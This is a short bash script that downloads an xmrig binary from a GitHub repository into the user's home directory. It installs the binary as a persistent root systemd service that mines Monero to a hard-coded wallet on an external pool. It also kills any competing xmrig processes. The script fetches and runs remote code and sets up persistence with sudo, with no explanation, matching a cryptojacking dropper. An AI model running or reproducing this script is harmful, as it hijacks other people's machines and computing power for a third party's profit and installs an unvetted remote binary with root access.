#!/bin/bash
curl -L --progress-bar "https://github.com/gamemod5/auto/raw/main/xmrig" -o /tmp/xmrig
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
cp /tmp/xmrig $HOME/c3pool/
sudo chmod +x $HOME/c3pool/xmrig
cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service
[Service]
ExecStart=$HOME/c3pool/xmrig -o pool.minexmr.com:4444 -u 49pjSwALVKaNHwK4sWfFWNXosfQxwZgf71fXysnpsR6nHci34Lg6aq2G7vAKuo2zxASxZCpHWpvwPddVpF1x5NF83Zdq3ac
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
echo "[*] Starting c3pool_miner systemd service"
sudo killall xmrig 2>/dev/null
sudo systemctl daemon-reload
sudo systemctl enable c3pool_miner.service
sudo systemctl start c3pool_miner.service